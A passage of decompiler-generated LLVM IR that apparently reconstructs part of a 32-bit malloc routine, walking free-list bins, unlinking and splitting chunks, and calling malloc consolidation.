  store i32 %v3_8052984, i32* @ebx, align 4
  %v0_8052987 = load i32, i32* @edi, align 4
  %v2_8052987 = add i32 %v3_8052984, 4
  %v3_8052987 = inttoptr i32 %v2_8052987 to i32*
  %v4_8052987 = load i32, i32* %v3_8052987, align 4
  %v10_8052987 = icmp ult i32 %v0_8052987, %v4_8052987
  %v1_805298a = icmp eq i1 %v10_8052987, false
  br i1 %v1_805298a, label %dec_label_pc_8052992, label %dec_label_pc_80529b0

dec_label_pc_8052992:                             ; preds = %dec_label_pc_8052984
  %v1_8052994 = or i32 %v0_8052987, 1
  store i32 %v1_8052994, i32* %eax.global-to-local, align 4
  store i32 %v3_8052977, i32* %ebx.global-to-local, align 4
  %v2_80529a8101 = add i32 %v3_8052977, 4
  %v3_80529a8102 = inttoptr i32 %v2_80529a8101 to i32*
  %v4_80529a8103 = load i32, i32* %v3_80529a8102, align 4
  %v10_80529a8105 = icmp ult i32 %v1_8052994, %v4_80529a8103
  br i1 %v10_80529a8105, label %dec_label_pc_8052999, label %dec_label_pc_80529ad

dec_label_pc_8052999:                             ; preds = %dec_label_pc_8052992, %dec_label_pc_8052999
  %v0_80529ad106 = phi i32 [ %v3_805299d, %dec_label_pc_8052999 ], [ %v3_8052977, %dec_label_pc_8052992 ]
  store i32 %v0_80529ad106, i32* %ecx.global-to-local, align 4
  %v1_805299d = add i32 %v0_80529ad106, 8
  %v2_805299d = inttoptr i32 %v1_805299d to i32*
  %v3_805299d = load i32, i32* %v2_805299d, align 4
  store i32 %v3_805299d, i32* %ecx.global-to-local, align 4
  store i32 %v3_805299d, i32* %ebx.global-to-local, align 4
  %v2_80529a8 = add i32 %v3_805299d, 4
  %v3_80529a8 = inttoptr i32 %v2_80529a8 to i32*
  %v4_80529a8 = load i32, i32* %v3_80529a8, align 4
  %v10_80529a8 = icmp ult i32 %v1_8052994, %v4_80529a8
  br i1 %v10_80529a8, label %dec_label_pc_8052999, label %dec_label_pc_80529ad

dec_label_pc_80529ad:                             ; preds = %dec_label_pc_8052999, %dec_label_pc_8052992
  %v0_80529ad.lcssa = phi i32 [ %v3_8052977, %dec_label_pc_8052992 ], [ %v3_805299d, %dec_label_pc_8052999 ]
  %v1_80529ad = add i32 %v0_80529ad.lcssa, 12
  %v2_80529ad = inttoptr i32 %v1_80529ad to i32*
  %v3_80529ad = load i32, i32* %v2_80529ad, align 4
  store i32 %v3_80529ad, i32* @ebx, align 4
  br label %dec_label_pc_80529b0

dec_label_pc_80529b0:                             ; preds = %dec_label_pc_8052956, %dec_label_pc_8052984, %dec_label_pc_8052967, %dec_label_pc_80529ad
  %v0_80529b0 = phi i32 [ %v0_8052969, %dec_label_pc_8052967 ], [ %v0_8052969, %dec_label_pc_80529ad ], [ %v0_8052969, %dec_label_pc_8052984 ], [ %v2_8052958, %dec_label_pc_8052956 ]
  %stack_var_-64.1 = phi i32 [ %v3_8052977, %dec_label_pc_8052967 ], [ %v0_80529ad.lcssa, %dec_label_pc_80529ad ], [ %v2_8052970, %dec_label_pc_8052984 ], [ %v3_8052962, %dec_label_pc_8052956 ]
  %v1_80529b2 = urem i32 %v0_80529b0, 32
  %v2_80529b2 = icmp eq i32 %v1_80529b2, 0
  store i32 %v1_80529b2, i32* %esi.global-to-local, align 4
  store i32 %v1_80529b2, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_80529bc = sdiv i32 %v0_80529b0, 32
  store i32 %v2_80529bc, i32* %edx.global-to-local, align 4
  br i1 %v2_80529b2, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_80529b0
  %v5_80529bf = shl i32 1, %v1_80529b2
  store i32 %v5_80529bf, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_80529b0, %bb
  %v5_80529c1 = phi i32 [ 1, %dec_label_pc_80529b0 ], [ %v5_80529bf, %bb ]
  %v1_80529c1 = mul nsw i32 %v2_80529bc, 4
  %v2_80529c1 = add i32 %v1_80529c1, ptrtoint (i32* @global_var_8068bd4.736 to i32)
  %v3_80529c1 = inttoptr i32 %v2_80529c1 to i32*
  %v4_80529c1 = load i32, i32* %v3_80529c1, align 4
  %v6_80529c1 = or i32 %v4_80529c1, %v5_80529c1
  store i32 %v6_80529c1, i32* %v3_80529c1, align 4
  %v0_80529c8 = load i32, i32* @ebx, align 4
  %v1_80529c8 = load i32, i32* @ebp, align 4
  %v2_80529c8 = add i32 %v1_80529c8, 12
  %v3_80529c8 = inttoptr i32 %v2_80529c8 to i32*
  store i32 %v0_80529c8, i32* %v3_80529c8, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_80529cf = load i32, i32* @ebp, align 4
  %v2_80529cf = add i32 %v1_80529cf, 8
  %v3_80529cf = inttoptr i32 %v2_80529cf to i32*
  store i32 %stack_var_-64.1, i32* %v3_80529cf, align 4
  %v0_80529d2 = load i32, i32* @ebp, align 4
  %v1_80529d2 = load i32, i32* @esi, align 4
  %v2_80529d2 = add i32 %v1_80529d2, 12
  %v3_80529d2 = inttoptr i32 %v2_80529d2 to i32*
  store i32 %v0_80529d2, i32* %v3_80529d2, align 4
  %v0_80529d5 = load i32, i32* @ebp, align 4
  %v1_80529d5 = load i32, i32* @ebx, align 4
  %v2_80529d5 = add i32 %v1_80529d5, 8
  %v3_80529d5 = inttoptr i32 %v2_80529d5 to i32*
  store i32 %v0_80529d5, i32* %v3_80529d5, align 4
  %v0_80529d8 = load i32, i32* @global_var_80688e0.735, align 32
  store i32 %v0_80529d8, i32* @ebp, align 4
  %v9_80529de = icmp eq i32 %v0_80529d8, 134645972
  %v1_80529e4 = icmp eq i1 %v9_80529de, false
  br i1 %v1_80529e4, label %dec_label_pc_8052907, label %dec_label_pc_80529ea

dec_label_pc_80529ea:                             ; preds = %bb82, %dec_label_pc_80529d8.preheader
  br i1 %v8_805289b, label %dec_label_pc_8052a78, label %dec_label_pc_80529f8

dec_label_pc_80529f8:                             ; preds = %dec_label_pc_80529ea
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_80529fc = mul i32 %stack_var_-40.0.ph, 8
  %v2_80529fc = add i32 %v1_80529fc, ptrtoint (i32* @global_var_80688cc.732 to i32)
  store i32 %v2_80529fc, i32* %edx.global-to-local, align 4
  %v1_8052a03 = add i32 %v1_80529fc, add (i32 ptrtoint (i32* @global_var_80688cc.732 to i32), i32 12)
  %v2_8052a03 = inttoptr i32 %v1_8052a03 to i32*
  %storemerge1.pre = load i32, i32* %v2_8052a03, align 4
  br label %dec_label_pc_8052a74

dec_label_pc_8052a08:                             ; preds = %dec_label_pc_8052a74
  %v1_8052a08 = add i32 %v4_8052a1f, 4
  %v2_8052a08 = inttoptr i32 %v1_8052a08 to i32*
  %v3_8052a08 = load i32, i32* %v2_8052a08, align 4
  store i32 %v3_8052a08, i32* %ebx.global-to-local, align 4
  %v1_8052a0b = add i32 %v4_8052a1f, 12
  %v2_8052a0b = inttoptr i32 %v1_8052a0b to i32*
  %v3_8052a0b = load i32, i32* %v2_8052a0b, align 4
  store i32 %v3_8052a0b, i32* @ecx, align 4
  %v1_8052a0e = and i32 %v3_8052a08, -4
  store i32 %v1_8052a0e, i32* @ebx, align 4
  %v10_8052a11 = icmp ult i32 %v1_8052a0e, %v1_8052bf2
  br i1 %v10_8052a11, label %dec_label_pc_8052a74, label %dec_label_pc_8052a17

dec_label_pc_8052a17:                             ; preds = %dec_label_pc_8052a08
  %v1_8052a17 = add i32 %v4_8052a1f, 8
  %v2_8052a17 = inttoptr i32 %v1_8052a17 to i32*
  %v3_8052a17 = load i32, i32* %v2_8052a17, align 4
  store i32 %v3_8052a17, i32* @edx, align 4
  %v1_8052a1a = add i32 %v3_8052a17, 12
  %v2_8052a1a = inttoptr i32 %v1_8052a1a to i32*
  %v3_8052a1a = load i32, i32* %v2_8052a1a, align 4
  %v15_8052a1a = icmp eq i32 %v3_8052a1a, %v4_8052a1f
  %v1_8052a1d = icmp eq i1 %v15_8052a1a, false
  br i1 %v1_8052a1d, label %dec_label_pc_8052a24, label %dec_label_pc_8052a1f

dec_label_pc_8052a1f:                             ; preds = %dec_label_pc_8052a17
  %v1_8052a1f = add i32 %v3_8052a0b, 8
  %v2_8052a1f = inttoptr i32 %v1_8052a1f to i32*
  %v3_8052a1f = load i32, i32* %v2_8052a1f, align 4
  %v15_8052a1f = icmp eq i32 %v3_8052a1f, %v4_8052a1f
  br i1 %v15_8052a1f, label %dec_label_pc_8052a29, label %dec_label_pc_8052a24

dec_label_pc_8052a24:                             ; preds = %dec_label_pc_8052a1f, %dec_label_pc_8052a17
  %v0_8052a24 = call i32 @abort()
  store i32 %v0_8052a24, i32* %eax.global-to-local, align 4
  %v0_8052a29.pre = load i32, i32* @ebx, align 4
  %v0_8052a2f.pre = load i32, i32* @ecx, align 4
  %v1_8052a2f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052a29

dec_label_pc_8052a29:                             ; preds = %dec_label_pc_8052a1f, %dec_label_pc_8052a24
  %v1_8052a2f = phi i32 [ %v3_8052a17, %dec_label_pc_8052a1f ], [ %v1_8052a2f.pre, %dec_label_pc_8052a24 ]
  %v0_8052a2f = phi i32 [ %v3_8052a0b, %dec_label_pc_8052a1f ], [ %v0_8052a2f.pre, %dec_label_pc_8052a24 ]
  %v0_8052a29 = phi i32 [ %v1_8052a0e, %dec_label_pc_8052a1f ], [ %v0_8052a29.pre, %dec_label_pc_8052a24 ]
  %v5_8052a2b = sub i32 %v0_8052a29, %v1_8052bf2
  store i32 %v5_8052a2b, i32* %esi.global-to-local, align 4
  %v2_8052a2f = add i32 %v1_8052a2f, 12
  %v3_8052a2f = inttoptr i32 %v2_8052a2f to i32*
  store i32 %v0_8052a2f, i32* %v3_8052a2f, align 4
  %v0_8052a32 = load i32, i32* @edx, align 4
  %v1_8052a32 = load i32, i32* @ecx, align 4
  %v2_8052a32 = add i32 %v1_8052a32, 8
  %v3_8052a32 = inttoptr i32 %v2_8052a32 to i32*
  store i32 %v0_8052a32, i32* %v3_8052a32, align 4
  %v0_8052a35 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052a35 = add i32 %v0_8052a35, 8
  store i32 %v1_8052a35, i32* @ecx, align 4
  %v0_8052a38 = load i32, i32* %esi.global-to-local, align 4
  %tmp137 = icmp ult i32 %v0_8052a38, 16
  br i1 %tmp137, label %dec_label_pc_8052f67, label %dec_label_pc_8052a41

dec_label_pc_8052a41:                             ; preds = %dec_label_pc_8052a29
  %v2_8052a45 = add i32 %v0_8052a35, %v1_8052bf2
  store i32 %v2_8052a45, i32* @edx, align 4
  %v1_8052a48 = or i32 %v1_8052bf2, 1
  store i32 %v1_8052a48, i32* %ebx.global-to-local, align 4
  %v2_8052a4b = add i32 %v0_8052a35, 4
  %v3_8052a4b = inttoptr i32 %v2_8052a4b to i32*
  store i32 %v1_8052a48, i32* %v3_8052a4b, align 4
  %v0_8052a4e = load i32, i32* %esi.global-to-local, align 4
  %v1_8052a50 = or i32 %v0_8052a4e, 1
  store i32 %v1_8052a50, i32* %eax.global-to-local, align 4
  %v0_8052a53 = load i32, i32* @edx, align 4
  %v1_8052a53 = load i32, i32* @ebp, align 4
  %v2_8052a53 = add i32 %v1_8052a53, 8
  %v3_8052a53 = inttoptr i32 %v2_8052a53 to i32*
  store i32 %v0_8052a53, i32* %v3_8052a53, align 4
  %v0_8052a56 = load i32, i32* @edx, align 4
  %v1_8052a56 = load i32, i32* @ebp, align 4
  %v2_8052a56 = add i32 %v1_8052a56, 12
  %v3_8052a56 = inttoptr i32 %v2_8052a56 to i32*
  store i32 %v0_8052a56, i32* %v3_8052a56, align 4
  %v0_8052a59 = load i32, i32* @edx, align 4
  %v1_8052a59 = add i32 %v0_8052a59, 8
  %v2_8052a59 = inttoptr i32 %v1_8052a59 to i32*
  store i32 ptrtoint (i32* @global_var_80688d4.734 to i32), i32* %v2_8052a59, align 4
  %v0_8052a60 = load i32, i32* @edx, align 4
  %v1_8052a60 = add i32 %v0_8052a60, 12
  %v2_8052a60 = inttoptr i32 %v1_8052a60 to i32*
  store i32 ptrtoint (i32* @global_var_80688d4.734 to i32), i32* %v2_8052a60, align 4
  %v0_8052a67 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052a67 = load i32, i32* @edx, align 4
  %v2_8052a67 = add i32 %v1_8052a67, 4
  %v3_8052a67 = inttoptr i32 %v2_8052a67 to i32*
  store i32 %v0_8052a67, i32* %v3_8052a67, align 4
  %v0_8052a6a = load i32, i32* %esi.global-to-local, align 4
  %v1_8052a6a = load i32, i32* @edx, align 4
  %v3_8052a6a = add i32 %v1_8052a6a, %v0_8052a6a
  %v4_8052a6a = inttoptr i32 %v3_8052a6a to i32*
  store i32 %v0_8052a6a, i32* %v4_8052a6a, align 4
  br label %dec_label_pc_8052f6c

dec_label_pc_8052a74:                             ; preds = %dec_label_pc_8052a08, %dec_label_pc_80529f8
  %v4_8052a1f = phi i32 [ %storemerge1.pre, %dec_label_pc_80529f8 ], [ %v3_8052a0b, %dec_label_pc_8052a08 ]
  store i32 %v4_8052a1f, i32* %eax.global-to-local, align 4
  %v12_8052a74 = icmp eq i32 %v4_8052a1f, %v2_80529fc
  %v1_8052a76 = icmp eq i1 %v12_8052a74, false
  br i1 %v1_8052a76, label %dec_label_pc_8052a08, label %dec_label_pc_8052a78.loopexit

dec_label_pc_8052a78.loopexit:                    ; preds = %dec_label_pc_8052a74
  br label %dec_label_pc_8052a78

dec_label_pc_8052a78:                             ; preds = %dec_label_pc_8052a78.loopexit, %dec_label_pc_80529ea
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8052a81 = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_8052a81, i32* %ecx.global-to-local, align 4
  %v2_8052a84 = udiv i32 %v1_8052a81, 32
  store i32 %v2_8052a84, i32* @edi, align 4
  %v1_8052a87 = mul nuw nsw i32 %v2_8052a84, 4
  %v2_8052a87 = add i32 %v1_8052a87, ptrtoint (i32* @global_var_8068bd4.736 to i32)
  %v3_8052a87 = inttoptr i32 %v2_8052a87 to i32*
  %v4_8052a87 = load i32, i32* %v3_8052a87, align 4
  store i32 %v4_8052a87, i32* %edx.global-to-local, align 4
  %v1_8052a8e = mul i32 %v1_8052a81, 8
  %v2_8052a8e = add i32 %v1_8052a8e, ptrtoint (i32* @global_var_80688cc.732 to i32)
  store i32 %v2_8052a8e, i32* %ebx.global-to-local, align 4
  %v1_8052a95 = urem i32 %v1_8052a81, 32
  %v2_8052a95 = icmp eq i32 %v1_8052a95, 0
  store i32 %v1_8052a95, i32* %ecx.global-to-local, align 4
  br i1 %v2_8052a95, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_8052a78
  %v5_8052a98 = shl i32 1, %v1_8052a95
  store i32 %v5_8052a98, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8052a78, %bb83, %dec_label_pc_8052ad9
  %v1_8052a9a = phi i32 [ %v1_8052a9a.pre, %dec_label_pc_8052ad9 ], [ %v4_8052a87, %bb83 ], [ %v4_8052a87, %dec_label_pc_8052a78 ]
  %v0_8052a9e = phi i32 [ %v0_8052a9a.pre, %dec_label_pc_8052ad9 ], [ %v5_8052a98, %bb83 ], [ 1, %dec_label_pc_8052a78 ]
  %tmp84 = icmp ule i32 %v0_8052a9e, %v1_8052a9a
  %v1_8052a9e = icmp eq i32 %v0_8052a9e, 0
  %v1_8052aa0 = icmp eq i1 %v1_8052a9e, false
  %or.cond = and i1 %tmp84, %v1_8052aa0
  br i1 %or.cond, label %dec_label_pc_8052a9e.dec_label_pc_8052ace.preheader_crit_edge, label %dec_label_pc_8052aa2.preheader

dec_label_pc_8052a9e.dec_label_pc_8052ace.preheader_crit_edge: ; preds = %.preheader
  %v0_8052ac912.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052ace.preheader

dec_label_pc_8052aa2.preheader:                   ; preds = %.preheader
  %v0_8052aa2.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052aa2

dec_label_pc_8052aa2:                             ; preds = %dec_label_pc_8052aa2.preheader, %dec_label_pc_8052aac
  %v0_8052aa2 = phi i32 [ %v0_8052aa2.pre, %dec_label_pc_8052aa2.preheader ], [ %v1_8052aa2, %dec_label_pc_8052aac ]
  %v1_8052aa2 = add i32 %v0_8052aa2, 1
  store i32 %v1_8052aa2, i32* @edi, align 4
  %v6_8052aa6 = icmp ugt i32 %v1_8052aa2, 2
  br i1 %v6_8052aa6, label %dec_label_pc_8052b5d.loopexit, label %dec_label_pc_8052aac

dec_label_pc_8052aac:                             ; preds = %dec_label_pc_8052aa2
  %v1_8052aac = mul i32 %v1_8052aa2, 4
  %v2_8052aac = add i32 %v1_8052aac, ptrtoint (i32* @global_var_8068bd4.736 to i32)
  %v3_8052aac = inttoptr i32 %v2_8052aac to i32*
  %v4_8052aac = load i32, i32* %v3_8052aac, align 4
  store i32 %v4_8052aac, i32* %edx.global-to-local, align 4
  %v1_8052ab3 = icmp eq i32 %v4_8052aac, 0
  br i1 %v1_8052ab3, label %dec_label_pc_8052aa2, label %dec_label_pc_8052ab7

dec_label_pc_8052ab7:                             ; preds = %dec_label_pc_8052aac
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8052abe = mul i32 %v1_8052aa2, 256
  store i32 %v2_8052abe, i32* %eax.global-to-local, align 4
  %v1_8052ac1 = add i32 %v2_8052abe, ptrtoint (i32* @global_var_80688cc.732 to i32)
  store i32 %v1_8052ac1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052ace.preheader

dec_label_pc_8052ace.preheader:                   ; preds = %dec_label_pc_8052a9e.dec_label_pc_8052ace.preheader_crit_edge, %dec_label_pc_8052ab7
  %v0_8052ac912 = phi i32 [ %v1_8052ac1, %dec_label_pc_8052ab7 ], [ %v0_8052ac912.pre, %dec_label_pc_8052a9e.dec_label_pc_8052ace.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8052ab7 ], [ %v0_8052a9e, %dec_label_pc_8052a9e.dec_label_pc_8052ace.preheader_crit_edge ]
  %v0_8052adf = phi i32 [ %v4_8052aac, %dec_label_pc_8052ab7 ], [ %v1_8052a9a, %dec_label_pc_8052a9e.dec_label_pc_8052ace.preheader_crit_edge ]
  %v2_8052ace4 = and i32 %v0_8052adf, %esi.promoted
  %v3_8052ace5 = icmp eq i32 %v2_8052ace4, 0
  br i1 %v3_8052ace5, label %dec_label_pc_8052ac9, label %dec_label_pc_8052ad2

dec_label_pc_8052ac9:                             ; preds = %dec_label_pc_8052ace.preheader, %dec_label_pc_8052ac9
  %v2_8052acc14 = phi i32 [ %v2_8052acc, %dec_label_pc_8052ac9 ], [ %esi.promoted, %dec_label_pc_8052ace.preheader ]
  %v0_8052ac913 = phi i32 [ %v1_8052ac9, %dec_label_pc_8052ac9 ], [ %v0_8052ac912, %dec_label_pc_8052ace.preheader ]
  %v1_8052ac9 = add i32 %v0_8052ac913, 8
  %v2_8052acc = mul i32 %v2_8052acc14, 2
  %v2_8052ace = and i32 %v2_8052acc, %v0_8052adf
  %v3_8052ace = icmp eq i32 %v2_8052ace, 0
  br i1 %v3_8052ace, label %dec_label_pc_8052ac9, label %dec_label_pc_8052ace.dec_label_pc_8052ad2_crit_edge

dec_label_pc_8052ace.dec_label_pc_8052ad2_crit_edge: ; preds = %dec_label_pc_8052ac9
  store i32 %v1_8052ac9, i32* %ebx.global-to-local, align 4
  store i32 %v2_8052acc, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052ad2

dec_label_pc_8052ad2:                             ; preds = %dec_label_pc_8052ace.dec_label_pc_8052ad2_crit_edge, %dec_label_pc_8052ace.preheader
  %v0_8052ad9 = phi i32 [ %v2_8052acc, %dec_label_pc_8052ace.dec_label_pc_8052ad2_crit_edge ], [ %esi.promoted, %dec_label_pc_8052ace.preheader ]
  %v1_8052afc = phi i32 [ %v1_8052ac9, %dec_label_pc_8052ace.dec_label_pc_8052ad2_crit_edge ], [ %v0_8052ac912, %dec_label_pc_8052ace.preheader ]
  %v1_8052ad2 = add i32 %v1_8052afc, 12
  %v2_8052ad2 = inttoptr i32 %v1_8052ad2 to i32*
  %v3_8052ad2 = load i32, i32* %v2_8052ad2, align 4
  store i32 %v3_8052ad2, i32* @ecx, align 4
  %v12_8052ad5 = icmp eq i32 %v3_8052ad2, %v1_8052afc
  %v1_8052ad7 = icmp eq i1 %v12_8052ad5, false
  br i1 %v1_8052ad7, label %dec_label_pc_8052aed, label %dec_label_pc_8052ad9

dec_label_pc_8052ad9:                             ; preds = %dec_label_pc_8052ad2
  %v2_8052adb = mul i32 %v0_8052ad9, 2
  store i32 %v2_8052adb, i32* %esi.global-to-local, align 4
  %v1_8052add = sub i32 -1, %v0_8052ad9
  store i32 %v1_8052add, i32* %eax.global-to-local, align 4
  %v2_8052adf = and i32 %v0_8052adf, %v1_8052add
  store i32 %v2_8052adf, i32* %edx.global-to-local, align 4
  %v1_8052ae1 = add i32 %v3_8052ad2, 8
  store i32 %v1_8052ae1, i32* %ebx.global-to-local, align 4
  %v1_8052ae4 = load i32, i32* @edi, align 4
  %v2_8052ae4 = mul i32 %v1_8052ae4, 4
  %v3_8052ae4 = add i32 %v2_8052ae4, ptrtoint (i32* @global_var_8068bd4.736 to i32)
  %v4_8052ae4 = inttoptr i32 %v3_8052ae4 to i32*
  store i32 %v2_8052adf, i32* %v4_8052ae4, align 4
  %v0_8052a9a.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8052a9a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8052aed:                             ; preds = %dec_label_pc_8052ad2
  %v1_8052aed = add i32 %v3_8052ad2, 4
  %v2_8052aed = inttoptr i32 %v1_8052aed to i32*
  %v3_8052aed = load i32, i32* %v2_8052aed, align 4
  store i32 %v3_8052aed, i32* %edx.global-to-local, align 4
  %v1_8052af0 = add i32 %v3_8052ad2, 12
  %v2_8052af0 = inttoptr i32 %v1_8052af0 to i32*
  %v3_8052af0 = load i32, i32* %v2_8052af0, align 4
  store i32 %v3_8052af0, i32* %eax.global-to-local, align 4
  %v1_8052af3 = and i32 %v3_8052aed, -4
  store i32 %v1_8052af3, i32* @edx, align 4
  %v5_8052af8 = sub i32 %v1_8052af3, %v1_8052bf2
  store i32 %v5_8052af8, i32* %esi.global-to-local, align 4
  store i32 %v3_8052af0, i32* %v2_8052ad2, align 4
  %v0_8052aff = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052aff = load i32, i32* %eax.global-to-local, align 4
  %v2_8052aff = add i32 %v1_8052aff, 8
  %v3_8052aff = inttoptr i32 %v2_8052aff to i32*
  store i32 %v0_8052aff, i32* %v3_8052aff, align 4
  %v0_8052b02 = load i32, i32* %esi.global-to-local, align 4
  %tmp138 = icmp ult i32 %v0_8052b02, 16
  %v0_8052b07 = load i32, i32* @ecx, align 4
  br i1 %tmp138, label %dec_label_pc_8052b07, label %dec_label_pc_8052b0e

dec_label_pc_8052b07:                             ; preds = %dec_label_pc_8052aed
  %v1_8052b07 = load i32, i32* @edx, align 4
  %v2_8052b07 = add i32 %v0_8052b07, 4
  %v3_8052b07 = add i32 %v2_8052b07, %v1_8052b07
  %v4_8052b07 = inttoptr i32 %v3_8052b07 to i32*
  %v5_8052b07 = load i32, i32* %v4_8052b07, align 4
  %v6_8052b07 = or i32 %v5_8052b07, 1
  store i32 %v6_8052b07, i32* %v4_8052b07, align 4
  br label %dec_label_pc_8052b55

dec_label_pc_8052b0e:                             ; preds = %dec_label_pc_8052aed
  %v2_8052b12 = add i32 %v0_8052b07, %v1_8052bf2
  store i32 %v2_8052b12, i32* %eax.global-to-local, align 4
  %v1_8052b1b = load i32, i32* @ebp, align 4
  %v2_8052b1b = add i32 %v1_8052b1b, 8
  %v3_8052b1b = inttoptr i32 %v2_8052b1b to i32*
  store i32 %v2_8052b12, i32* %v3_8052b1b, align 4
  %v0_8052b1e = load i32, i32* %eax.global-to-local, align 4
  %v1_8052b1e = load i32, i32* @ebp, align 4
  %v2_8052b1e = add i32 %v1_8052b1e, 12
  %v3_8052b1e = inttoptr i32 %v2_8052b1e to i32*
  store i32 %v0_8052b1e, i32* %v3_8052b1e, align 4
  %v0_8052b21 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052b21 = add i32 %v0_8052b21, 8
  %v2_8052b21 = inttoptr i32 %v1_8052b21 to i32*
  store i32 ptrtoint (i32* @global_var_80688d4.734 to i32), i32* %v2_8052b21, align 4
  %v0_8052b28 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052b28 = add i32 %v0_8052b28, 12
  %v2_8052b28 = inttoptr i32 %v1_8052b28 to i32*
  store i32 ptrtoint (i32* @global_var_80688d4.734 to i32), i32* %v2_8052b28, align 4
  %v0_8052b2f = load i32, i32* @global_var_80688d0.733, align 16
  %v4_8052b35 = load i32, i32* %eax.global-to-local, align 4
  %v5_8052b35 = select i1 %v8_805289b, i32 %v4_8052b35, i32 %v0_8052b2f
  %v4_8052b38 = or i32 %v1_8052bf2, 1
  store i32 %v5_8052b35, i32* @global_var_80688d0.733, align 16
  %v0_8052b43 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8052b38, i32* %ebx.global-to-local, align 4
  %v1_8052b49 = or i32 %v0_8052b43, 1
  store i32 %v1_8052b49, i32* @edx, align 4
  %v3_8052b4c = add i32 %v0_8052b43, %v4_8052b35
  %v4_8052b4c = inttoptr i32 %v3_8052b4c to i32*
  store i32 %v0_8052b43, i32* %v4_8052b4c, align 4
  %v0_8052b4f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052b4f = load i32, i32* @ecx, align 4
  %v2_8052b4f = add i32 %v1_8052b4f, 4
  %v3_8052b4f = inttoptr i32 %v2_8052b4f to i32*
  store i32 %v0_8052b4f, i32* %v3_8052b4f, align 4
  %v0_8052b52 = load i32, i32* @edx, align 4
  %v1_8052b52 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052b52 = add i32 %v1_8052b52, 4
  %v3_8052b52 = inttoptr i32 %v2_8052b52 to i32*
  store i32 %v0_8052b52, i32* %v3_8052b52, align 4
  br label %dec_label_pc_8052b55

dec_label_pc_8052b55:                             ; preds = %dec_label_pc_8052c49, %dec_label_pc_8052b07, %dec_label_pc_8052b0e
  %v0_8052b55 = load i32, i32* @ecx, align 4
  %v1_8052b55 = add i32 %v0_8052b55, 8
  store i32 %v1_8052b55, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052f7d

dec_label_pc_8052b5d.loopexit:                    ; preds = %dec_label_pc_8052aa2
  br label %dec_label_pc_8052b5d

dec_label_pc_8052b5d:                             ; preds = %dec_label_pc_8052b5d.loopexit, %dec_label_pc_805285d, %dec_label_pc_8052865
  %v0_8052b5d = load i32, i32* @global_var_80688cc.732, align 4
  store i32 %v0_8052b5d, i32* @ebx, align 4
  store i32 %v1_8052bf2, i32* %esi.global-to-local, align 4
  %v1_8052b67 = add i32 %v0_8052b5d, 4
  %v2_8052b67 = inttoptr i32 %v1_8052b67 to i32*
  %v3_8052b67 = load i32, i32* %v2_8052b67, align 4
  %v1_8052b6a = add i32 %v1_8052bf2, 16
  store i32 %v1_8052b6a, i32* @esi, align 4
  %v1_8052b71 = and i32 %v3_8052b67, -4
  store i32 %v1_8052b71, i32* %ecx.global-to-local, align 4
  %v7_8052b74 = icmp ult i32 %v1_8052b71, %v1_8052b6a
  br i1 %v7_8052b74, label %dec_label_pc_8052b94, label %dec_label_pc_8052b78

dec_label_pc_8052b78:                             ; preds = %dec_label_pc_8052b5d
  %v2_8052b7c = add i32 %v0_8052b5d, %v1_8052bf2
  store i32 %v2_8052b7c, i32* @edx, align 4
  %v1_8052b7f = or i32 %v1_8052bf2, 1
  store i32 %v1_8052b7f, i32* %eax.global-to-local, align 4
  store i32 %v2_8052b7c, i32* @global_var_80688cc.732, align 4
  store i32 %v1_8052b7f, i32* %v2_8052b67, align 4
  %v0_8052b8b = load i32, i32* %ecx.global-to-local, align 4
  %v5_8052b8b = sub i32 %v0_8052b8b, %v1_8052bf2
  store i32 %v5_8052b8b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052f0d

dec_label_pc_8052b94:                             ; preds = %dec_label_pc_8052b5d
  %v0_8052b94 = load i8, i8* @global_var_80688a0.731, align 32
  %v1_8052b94 = and i8 %v0_8052b94, 2
  %v2_8052b94 = icmp eq i8 %v1_8052b94, 0
  %v0_8052b9b = load i32, i32* @global_var_8068bfc.737, align 4
  store i32 %v0_8052b9b, i32* %edx.global-to-local, align 4
  br i1 %v2_8052b94, label %dec_label_pc_8052bc8, label %dec_label_pc_8052ba3

dec_label_pc_8052ba3:                             ; preds = %dec_label_pc_8052b94
  store i32 ptrtoint (i8* @global_var_80688a0.731 to i32), i32* %stack_var_-92, align 4
  %v2_8052bab = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80688a0.731 to i32*))
  store i32 ptrtoint (i8* @global_var_80688a0.731 to i32), i32* @ebx, align 4
  %v1_8052bb5 = add i32 %v1_8052bf2, -7
  store i32 %v1_8052bb5, i32* %eax.global-to-local, align 4
  store i32 %v1_8052bb5, i32* %stack_var_-92, align 4
  %v1_8052bb9 = call i32 @malloc(i32 %v1_8052bb5)
  store i32 %v1_8052bb9, i32* %eax.global-to-local, align 4
  store i32 %v1_8052bb9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052f7d

dec_label_pc_8052bc8:                             ; preds = %dec_label_pc_8052b94
  store i32 %v1_8052bf2, i32* @ebx, align 4
  %v1_8052bcc = add i32 %v0_8052b9b, -1
